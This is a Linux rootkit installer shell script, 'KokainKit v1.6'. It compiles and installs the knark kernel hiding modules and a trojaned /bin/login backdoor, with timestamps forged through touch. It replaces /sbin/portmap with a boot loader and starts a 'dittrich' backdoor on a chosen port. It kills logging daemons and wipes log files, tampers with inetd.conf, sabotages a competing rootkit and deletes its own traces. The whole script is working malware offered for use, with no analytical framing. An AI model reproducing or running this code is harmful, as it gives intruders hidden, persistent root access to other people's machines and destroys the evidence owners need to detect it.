#!/bin/sh

# KokainKit v1.6 by deka
# -
# A rootkit based on knark and cobolt.
# Do not Distribute!
# -

TORNDIR=/usr/src/.puta
THEPASS=$1
DITTPORT=$2
THEDIR=/usr/lib/$THEPASS

echo "---------------------------------------"
echo "[1;32m       KokainKit v1.6 by dekah&self[0m"
echo "---------------------------------------"
echo ""
echo "Using magic word $THEPASS and dittrichport $DITTPORT."
echo "Installing. Please stand by... (Pour yourself an ice cold coke and chill)"

if ! test "$(whoami)" = "root"; then
  echo "  - UID0 check failed"
  echo ""
  sleep 3
  echo "FATAL: You're not root"
  exit 1
fi

if test -d "$TORNDIR"; then
  echo "  - T0rnKit found. Screwing it up"
  killall -9 in.inetd
  killall -9 t0rntd
  echo "$RANDOMdecryptThisT0rn :D" > /etc/ttyhash
  echo "" > /usr/sbin/in.inetd
  echo "ap" > $TORNDIR/.1file
  echo "255.255" > $TORNDIR/.1addr
  echo "255.255" > $TORNDIR/.1logz
  echo "ap" > $TORNDIR/.1proc
fi

if ! test -d "/usr/include"; then
  echo "  - /usr/include does not exist, making it (ugly)..."
  mkdir /usr/include
fi

if ! test -d "/usr/include/pwdb"; then
  echo "  - /usr/include/pwdb does not exist, making it (ugly)..."
  mkdir /usr/include/pwdb
fi

mkdir $THEDIR
if test -d "$THEDIR"; then
  echo "  - Secret dir created"
else
  echo "  - MkDir failed"
  echo ""
  echo "FATAL: Unable to create the secret directory"
  exit 1
fi

cd src
echo "#define MAGIC_WORD \"$THEPASS\"" > kokain.h
echo "#define MAGIC_DIR  \"$THEDIR\"" >> kokain.h

gcc -O2 cobolt.c -o cobolt
if test -r "./cobolt"; then
  echo "  - Cobolt compiled"
else
  echo "  - gcc failed"
  echo ""
  cd ..
  sleep 3
  echo "FATAL: Unable to compile Cobolt"
  exit 1
fi
touch -acmr /bin/login cobolt
cp /bin/login $THEDIR/login1
cp cobolt $THEDIR/login2
echo "  - Cobolt installed"

gcc -O2 autoexec.c -o autoexec
if test -r "./autoexec"; then
  echo "  - AutoExec compiled"
else
  echo "  - gcc failed"
  echo ""
  cd ..
  echo "FATAL: Unable to compile AutoExec"
  exit 1
fi

touch -acmr /sbin/portmap autoexec
cp /sbin/portmap $THEDIR/portmap
rm -f /sbin/portmap
cp autoexec /sbin/portmap
echo "#!/bin/sh" > $THEDIR/autoexec
echo "  - AutoExec installed"
cd ..

killall -9 syslogd klogd
./wipe u root >/dev/null 2>&1
rm -f /var/log/messages /var/log/secure
cp /var/log/messages.1 /var/log/messages >/dev/null 2>&1
cp /var/log/secure.1 /var/log/secure >/dev/null 2>&1
cp /var/log/messages.0 /var/log/messages >/dev/null 2>&1
cp /var/log/secure.0 /var/log/secure >/dev/null 2>&1
echo "  - Logs cleaned"

#echo "" > /etc/hosts.allow
#echo "" > /etc/hosts.deny
#echo "  - Hosts.deny/Hosts.allow cleaned"
echo "  - Patching dittrich..."
./bpatch ./dittrich __PATCHPort__ $DITTPORT

cat <<E0F>> $THEDIR/.bashrc
alias ls="ls --color -alF"
alias dir="dir --color"
export PS1="\u@\h:\w# "
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/X11R6/bin:$THEDIR:$THEDIR/stuff
cd
E0F
echo "  - .bashrc created"

cp -R dittrich stuff $THEDIR
echo "  - Stuff installed"

mkdir $THEDIR/knrk
cd knark
make >/dev/null 2>&1
echo "  - Knark compiled"
cd ..
rm -rf knark/knrksrc knark/Makefile
cp -R knark/* $THEDIR/knrk
echo "/sbin/insmod -f $THEDIR/knrk/knrk.o" >> $THEDIR/autoexec
echo "/sbin/insmod -f $THEDIR/knrk/knrkmodhide.o" >> $THEDIR/autoexec
echo "$THEDIR/knrk/knrkhidef $THEDIR" >> $THEDIR/autoexec
echo "$THEDIR/knrk/knrkered /bin/login $THEDIR/login2" >> $THEDIR/autoexec
echo "$THEDIR/knrk/knrknethide \":`./tohex $DITTPORT`\"" >> $THEDIR/autoexec 
echo "$THEDIR/dittrich" >> $THEDIR/autoexec
echo "killall -31 dittrich" >> $THEDIR/autoexec

/sbin/portmap >/dev/null 2>&1
echo "  - Knark installed"

if test -d "/var/named/ADMROCKS"; then
  rm -rf /var/named/ADMROCKS
  echo "  - AdmRocks erased"
fi

cat /etc/inetd.conf | grep -v "2222" > /tmp/blahah
rm -f /etc/inetd.conf
cp /tmp/blahah /etc/inetd.conf
rm -f /tmp/blahah
echo "  - Inetd.conf fixed"

PATH=/sbin:$PATH
syslogd
klogd
echo "  - Syslogd/Klogd restarted"
cd ..
rm -rf *kokain*
echo "  - KokainKit removed"

echo ""
#echo "[1;34m--x( th1z b0x n0w b3L0NgZ t0 j00! )x-- --x(.:tHE:kOkAiNkIt:.)x--[0m"
if test -d "/proc/$THEPASS";
then
  echo "Knark installed successfully."
else
  echo " KNARK INSTALLATION FAILED - INSTALLING LOGIN BD"
  cp $THEDIR/login2 /bin/login
fi
echo "kitinst $THEPASS $DITTPORT" 
# - EoF - #
